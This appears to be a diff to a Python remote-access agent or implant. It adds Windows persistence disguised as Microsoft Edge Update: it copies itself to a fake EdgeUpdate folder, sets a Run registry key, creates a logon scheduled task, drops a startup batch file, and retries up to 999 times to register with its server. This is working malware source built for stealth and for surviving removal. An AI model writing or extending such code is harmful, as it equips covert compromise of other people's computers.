@@ -373,43 +373,78 @@ def install_persistence():
         except Exception as e:
             print(f"[!] crontab fail: {e}")
     else:
-        # Windows: copy to AppData with legit name, add to startup
+        # Windows: copy to AppData, registry + schtasks + startup folder
         import shutil
         local_appdata = os.environ.get("LOCALAPPDATA", os.environ.get("APPDATA", os.path.expanduser("~")))
         hide_dir = os.path.join(local_appdata, "Microsoft", "EdgeUpdate")
         target = os.path.join(hide_dir, "EdgeUpdate.exe")
+        log_file = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "edgeupdate.log")
         try:
             os.makedirs(hide_dir, exist_ok=True)
             if os.path.abspath(sys.executable) != os.path.abspath(target):
                 shutil.copy2(sys.executable, target)
-            _add_windows_startup("MicrosoftEdgeUpdate", target)
-            print(f"[+] Windows persistence: {target}")
+            ok = _win_persistence_install(target, log_file)
+            with open(log_file, "a") as lf:
+                lf.write(f"OK={ok} target={target}\n")
+            if ok:
+                print(f"[+] Windows persistence: {target}")
+            else:
+                print(f"[!] Windows persistence FAILED — check {log_file}")
         except Exception as e:
-            print(f"[!] Windows install fail: {e}")
+            msg = f"[!] Windows install fail: {e}"
+            print(msg)
+            try:
+                with open(log_file, "a") as lf:
+                    lf.write(f"EXCEPTION: {e}\n")
+            except Exception:
+                pass
 
-def _add_windows_startup(name, target):
-    # Registry Run key (HKCU, no admin)
+def _win_persistence_install(target, log_file):
+    ok = False
+    try:
+        with open(log_file, "w") as lf:
+            lf.write(f"target={target}\n")
+    except Exception:
+        pass
+    # 1) Registry Run key
     try:
         import winreg
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
             r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{target}" --no-install')
+        val = f'"{target}" --no-install'
+        winreg.SetValueEx(key, "MicrosoftEdgeUpdate", 0, winreg.REG_SZ, val)
         winreg.CloseKey(key)
-        print(f"[+] Registry Run key: {name}")
-    except Exception:
-        pass
-    # Startup folder fallback (VBS for hidden window)
+        ok = True
+        with open(log_file, "a") as lf:
+            lf.write(f"REGISTRY OK: {val}\n")
+    except Exception as e:
+        with open(log_file, "a") as lf:
+            lf.write(f"REGISTRY FAIL: {e}\n")
+    # 2) schtasks (user-level, no admin)
+    try:
+        cmd = f'schtasks /create /tn "MicrosoftEdgeUpdate" /tr "\'{target}\' --no-install" /sc onlogon /rl limited /f'
+        subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
+        with open(log_file, "a") as lf:
+            lf.write(f"SCHTASKS OK\n")
+        ok = True
+    except Exception as e:
+        with open(log_file, "a") as lf:
+            lf.write(f"SCHTASKS FAIL: {e}\n")
+    # 3) Startup folder (batch file)
     try:
         startup = os.path.join(os.environ.get("APPDATA", ""),
             "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
         if startup and os.path.isdir(startup):
-            vbs = os.path.join(startup, f"{name}.vbs")
-            if not os.path.exists(vbs):
-                with open(vbs, "w") as f:
-                    f.write('CreateObject("Wscript.Shell").Run "' + target + ' --no-install", 0, False\n')
-                print(f"[+] Startup folder: {vbs}")
-    except Exception:
-        pass
+            bat = os.path.join(startup, "MicrosoftEdgeUpdate.bat")
+            with open(bat, "w") as f:
+                f.write(f'@start "" /b "{target}" --no-install\n')
+            with open(log_file, "a") as lf:
+                lf.write(f"STARTUP OK: {bat}\n")
+            ok = True
+    except Exception as e:
+        with open(log_file, "a") as lf:
+            lf.write(f"STARTUP FAIL: {e}\n")
+    return ok
 
 def remove_persistence():
     if platform.system() != "Windows":
@@ -425,6 +460,10 @@ def remove_persistence():
             pass
     else:
         try:
+            subprocess.run('schtasks /delete /tn "MicrosoftEdgeUpdate" /f', shell=True, capture_output=True)
+        except Exception:
+            pass
+        try:
             import winreg
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                 r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
@@ -436,9 +475,9 @@ def remove_persistence():
             startup = os.path.join(os.environ.get("APPDATA", ""),
                 "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
             if startup:
-                lnk = os.path.join(startup, "MicrosoftEdgeUpdate.url")
-                if os.path.exists(lnk):
-                    os.unlink(lnk)
+                for fname in os.listdir(startup):
+                    if "MicrosoftEdgeUpdate" in fname:
+                        os.unlink(os.path.join(startup, fname))
         except Exception:
             pass
         local_appdata = os.environ.get("LOCALAPPDATA", os.environ.get("APPDATA", ""))
@@ -479,11 +518,21 @@ def main():
         remove_persistence(); return
 
     print(f"[agent] {SERVER}")
-    if not get_key():
-        print("[agent] key fail"); return
-    INTERVAL = register()
-    if not AID:
-        print("[agent] register fail"); return
+    for attempt in range(999):
+        if get_key():
+            break
+        print(f"[agent] key fail (attempt {attempt+1}), retry in 10s")
+        time.sleep(10)
+    else:
+        return
+    for attempt in range(999):
+        INTERVAL = register()
+        if AID:
+            break
+        print(f"[agent] register fail (attempt {attempt+1}), retry in 10s")
+        time.sleep(10)
+    else:
+        return
     print(f"[agent] id={AID} interval={INTERVAL}s")
     if not no_install:
         install_persistence()
